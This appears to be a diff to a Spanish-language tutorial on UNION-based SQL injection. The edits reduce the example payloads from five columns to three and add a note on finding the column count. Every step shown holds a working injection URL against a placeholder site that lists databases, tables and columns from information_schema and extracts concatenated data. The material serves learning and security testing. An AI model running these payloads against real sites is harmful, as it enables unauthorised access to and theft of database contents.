@@ -304,7 +304,7 @@ Ejemplo con 3 columnas:
 http://ejemplo.com/product.php?id=1' UNION SELECT 1,2,3-- -
 ```
 
-Si ves 1, 2, 3 en la página, la inyección funciona. Aunque solo apararezca uno de los números nos vale porque es en ese en el que inyectaremos la consulta.
+Si ves 1, 2, 3 en la página, la inyección funciona. Aunque solo apararezca uno de los números nos vale porque es en ese en el que inyectaremos la consulta. la clave es que si metemos el 4 da error y sabemos que las válidas son 3
 
 ---
 ---
@@ -312,13 +312,13 @@ Si ves 1, 2, 3 en la página, la inyección funciona. Aunque solo apararezca uno
 ## Paso 4️⃣ Listar bases de datos
 
 ```bash
-http://ejemplo.com/product.php?id=1' UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -
+http://ejemplo.com/product.php?id=1' UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -
 ```
 
 Con LIMIT:
 
 ```bash
-http://ejemplo.com/product.php?id=1' UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata LIMIT 0,1-- -
+http://ejemplo.com/product.php?id=1' UNION SELECT 1,schema_name,3 FROM information_schema.schemata LIMIT 0,1-- -
 ```
 
 ---
@@ -326,7 +326,7 @@ http://ejemplo.com/product.php?id=1' UNION SELECT 1,schema_name,3,4,5 FROM infor
 ## Paso 5️⃣ Listar nombres de tablas
 
 ```bash
-http://ejemplo.com/product.php?id=1' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema="<NOMBRE_BASE_DATOS>"-- -
+http://ejemplo.com/product.php?id=1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema="<NOMBRE_BASE_DATOS>"-- -
 ```
 
 ---
@@ -334,7 +334,7 @@ http://ejemplo.com/product.php?id=1' UNION SELECT 1,table_name,3,4,5 FROM inform
 ## Paso 6️⃣ Listar columnas
 
 ```bash
-http://ejemplo.com/product.php?id=1' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema="<NOMBRE_BASE_DATOS>" AND table_name="<NOMBRE_TABLA>"-- -
+http://ejemplo.com/product.php?id=1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_schema="<NOMBRE_BASE_DATOS>" AND table_name="<NOMBRE_TABLA>"-- -
 ```
 
 ---
@@ -342,7 +342,7 @@ http://ejemplo.com/product.php?id=1' UNION SELECT 1,column_name,3,4,5 FROM infor
 ## Paso 7️⃣ Mostrar datos concatenados
 
 ```bash
-http://ejemplo.com/product.php?id=1' UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUMNA2>),3,4,5 FROM <NOMBRE_BASE_DATOS>.<NOMBRE_TABLA>-- -
+http://ejemplo.com/product.php?id=1' UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUMNA2>),3 FROM <NOMBRE_BASE_DATOS>.<NOMBRE_TABLA>-- -
 ```
 
 (0x3a representa el carácter ":")
